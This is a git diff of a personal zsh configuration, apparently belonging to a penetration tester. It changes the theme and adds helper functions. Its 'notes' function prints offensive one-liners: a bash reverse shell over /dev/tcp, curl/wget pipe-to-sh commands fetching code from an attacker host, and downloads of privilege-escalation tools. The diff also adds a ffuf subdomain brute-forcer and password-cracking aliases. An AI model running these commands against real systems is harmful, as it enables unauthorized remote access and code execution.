@@ -8,7 +8,7 @@ export ZSH="$HOME/.oh-my-zsh"
 # load a random theme each time oh-my-zsh is loaded, in which case,
 # to know which specific one was loaded, run: echo $RANDOM_THEME
 # See https://github.com/ohmyzsh/ohmyzsh/wiki/Themes
-ZSH_THEME="robbyrussell"
+ZSH_THEME="norm"
 
 # Set list of themes to pick from when loading at random
 # Setting this variable when ZSH_THEME=random will cause zsh to load
@@ -130,9 +130,15 @@ function notes() {
     echo -e "export SHELL=/bin/bash TERM=xterm;stty rows 47 cols 247"
     echo -e "/bin/bash -c \"nohup /bin/bash -i &>/dev/tcp/$(</tmp/local.txt)/1337 0>&1 &\""
     echo -e "curl $(</tmp/local.txt):9001|sh"
-    echo -e "wget $(</tmp/local.txt):9001|sh"
+    echo -e "wget -O- $(</tmp/local.txt):9001|sh"
     echo -e "wget $(</tmp/local.txt):8000/{lse.sh,pspy64}"
     echo -e "curl $(</tmp/local.txt):8000/{lse.sh,pspy64} -O{lse.sh,pspy64}"
+}
+function subbrute {
+    ffuf -H "Host: FUZZ.$2" -w ~/SecLists/Discovery/DNS/subdomains-all.txt -u "$1" ${@:3}
+}
+function mkcd {
+    mkdir -p $1 && cd $1
 }
 
 alias nc="ncat"
@@ -143,5 +149,6 @@ alias feroxbuster="feroxbuster -A --no-state"
 alias john="~/tools/john/run/john"
 alias j="john --wordlist=/home/l1nvx/SecLists/Passwords/Leaked-Databases/rockyou.txt"
 alias firefox="~/Escritorio/firefox/firefox-bin"
-
-eval "$(starship init zsh)"
+alias notes="notes | fzf | xclip -r -sel clip"
+alias go="/usr/lib/go-1.21/bin/go"
+#eval "$(starship init zsh)"
